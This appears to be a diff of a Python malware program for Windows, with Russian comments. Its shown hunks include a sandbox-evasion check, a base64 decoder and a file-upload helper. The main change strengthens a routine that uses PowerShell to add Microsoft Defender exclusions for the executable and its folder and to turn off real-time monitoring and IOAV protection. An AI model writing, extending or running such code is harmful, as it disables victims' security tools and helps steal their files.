@@ -22,7 +22,7 @@ def _sandbox():
         sys.exit(0)
 _sandbox()
 
-# ---- ДЕКОДЕР BASE64 ----
+
 def _d(s):
     return base64.b64decode(s).decode()
 
@@ -76,15 +76,17 @@ def _upload_single(file_path):
     except: pass
     return None
 
-# ---- ОТКЛЮЧЕНИЕ DEFENDER ----
 def _disable_defender():
     try:
-        # Мы уже админ, так что проверка не нужна, но оставим для безопасности
         if not ctypes.windll.shell32.IsUserAnAdmin():
             return 'not_admin'
         exe = sys.executable if getattr(sys, 'frozen', False) else sys.executable
-        subprocess.run(f'powershell -Command "Set-MpPreference -ExclusionPath \\"{exe}\\""', shell=True, capture_output=True)
+        # Добавляем исключения
+        subprocess.run(f'powershell -Command "Add-MpPreference -ExclusionPath \\"{exe}\\""', shell=True, capture_output=True)
+        subprocess.run(f'powershell -Command "Add-MpPreference -ExclusionPath \\"{os.path.dirname(exe)}\\""', shell=True, capture_output=True)
+        # Отключаем защиту
         subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True)
+        subprocess.run('powershell -Command "Set-MpPreference -DisableIOAVProtection $true"', shell=True, capture_output=True)
         return 'disabled'
     except Exception as e:
         return f'error: {e}'
